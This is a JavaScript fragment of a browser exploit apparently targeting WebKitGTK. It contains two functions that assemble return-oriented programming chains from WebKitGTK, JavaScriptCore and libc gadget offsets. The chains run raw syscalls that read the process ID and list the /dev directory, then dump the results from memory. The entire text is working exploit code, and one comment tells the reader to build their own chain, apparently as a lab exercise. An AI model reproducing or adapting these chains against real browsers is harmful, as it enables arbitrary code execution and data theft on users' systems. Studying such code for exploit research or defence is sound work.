function get_pid()
{
  debug_log("Get PID")
  u32[0x10] = u32[0x14];
  u32[0x11] = u32[0x15];

  var nr_getpid = 39

  syscall("getpid", nr_getpid)
  // rax == current pid
  // dump rax value

  // pop rdx ; ret ;
  rop_chain.push(webkitgtk_base_addr_low + offset_pop_rdx)
  rop_chain.push(webkitgtk_base_addr_high)
  rop_chain.push(bss_addr_low)
  rop_chain.push(bss_addr_high)

  // rdx == bss
  // mov qword [rdx], rax ; ret ;
  rop_chain.push(webkitgtk_base_addr_low + 0x476f2d)
  rop_chain.push(webkitgtk_base_addr_high)

  // Finally dump 8 byte from [rdx](== rax) value
  rawdump(bss_addr, new dcodeIO.Long(8, 0, true))
  inject_ropcode(rop_chain)
  cbuf.byteLength; // call *0x8(%rax) => firstly jump to cbuf[2]
}

function fs_dump()
{
  debug_log("Get /dev dump")
  u32[0x10] = u32[0x14];
  u32[0x11] = u32[0x15];

  var nr_open = 2, nr_getdents = 78

  write_str(bss_addr_low, bss_addr_high, "/dev")

  // fd = open(bss_addr, 0, 0)
  syscall("open", nr_open,
          new dcodeIO.Long(bss_addr_low, bss_addr_high, true),
          new dcodeIO.Long(0, 0, true))

  /* NOTE: You must build your own chain.
   * Don't use syscall() helper function here. */

  // push rax ; pop rdi ; ret (push fd, arg1 = fd)
  rop_chain.push(js_core_base_addr_low + 0x4d17a0)
  rop_chain.push(js_core_base_addr_high)

  // pop rsi ; ret ;  (arg2 = buf)
  rop_chain.push(webkitgtk_base_addr_low + offset_pop_rsi)
  rop_chain.push(webkitgtk_base_addr_high)
  rop_chain.push(bss_addr_low + 0x60)
  rop_chain.push(bss_addr_high)

  // pop rdx ; ret ;  (arg3 = 4096)
  rop_chain.push(webkitgtk_base_addr_low + offset_pop_rdx)
  rop_chain.push(webkitgtk_base_addr_high)
  rop_chain.push(4096)
  rop_chain.push(0)

  // pop rax ; ret ;  (rax = nr_getdents)
  rop_chain.push(webkitgtk_base_addr_low + offset_pop_rax)
  rop_chain.push(webkitgtk_base_addr_high)
  rop_chain.push(nr_getdents)
  rop_chain.push(0x0)

  // syscall ; ret ;
  rop_chain.push(libc_base_addr_low + 0xc5c55)
  rop_chain.push(libc_base_addr_high);

  // Finally dump 4096 byte from buf(== bss_addr + 0x60)
  rawdump(new dcodeIO.Long(bss_addr_low+0x60, bss_addr_high), new dcodeIO.Long(4096, 0, true))

  inject_ropcode(rop_chain)
  cbuf.byteLength; // call *0x8(%rax) => firstly jump to cbuf[2]
}
